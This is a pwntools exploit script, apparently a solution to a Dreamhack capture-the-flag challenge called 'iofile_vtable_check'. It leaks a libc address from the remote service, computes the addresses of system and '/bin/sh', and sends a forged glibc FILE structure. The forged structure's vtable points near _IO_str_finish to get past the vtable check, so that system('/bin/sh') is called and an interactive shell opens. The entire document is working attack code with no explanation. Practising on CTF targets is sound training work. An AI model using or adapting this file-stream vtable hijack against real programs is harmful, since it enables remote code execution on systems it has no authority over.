from pwn import *
#p = process("./iofile_vtable_check")
p = remote("host1.dreamhack.games", 23833)
pause()
elf = ELF("./iofile_vtable_check")
#libc = elf.libc
libc = ELF("./libc.so.6")
p.recvuntil("stdout: ")
leak = int(p.recv(14), 16)
libc_base = leak - libc.symbols['_IO_2_1_stdout_']
system = libc_base + libc.symbols['system']
#system = libc_base + 0x4f3d5

binsh = libc_base + next(libc.search("/bin/sh"))
_IO_file_jumps = libc_base + libc.symbols['_IO_file_jumps']
io_str_overflow = _IO_file_jumps + 0xd8
_IO_str_finish = _IO_file_jumps + 0xd0
p.info("_IO_file_jumps : " + hex(_IO_file_jumps))
p.info("_IO_str_finish : " + hex(_IO_str_finish))
#fake_vtable = io_str_overflow - 16
fake_vtable = _IO_str_finish - 0x18 + 0x8
#print(hex(_IO_str_finish))
fp = elf.symbols['fp']

p.info("libc base : " + hex(libc_base))
p.info("system : " + hex(system))
p.info("binsh : " + hex(binsh))

payload = p64(0) # flag
payload += p64(0x0) # _IO_read_ptr
payload += p64(0x0) # _IO_read_end
payload += p64(0x0) # _IO_read_base
payload += p64(0x0) # _IO_write_base
payload += p64(0x1) # _IO_write_ptr
payload += p64(0x0) # _IO_write_end
payload += p64(binsh) # _IO_buf_base
payload += p64(0x0) # _IO_buf_end
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)

payload += p64(0x0)
payload += p64(fp + 0x80) # _lock

payload += p64(0x0) * 3
payload += p64(0x2)
payload += p64(0x3)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0) *2
payload += p64(fake_vtable)
payload += p64(0x0)
payload += p64(system) * 2
p.sendline(payload)

p.interactive()
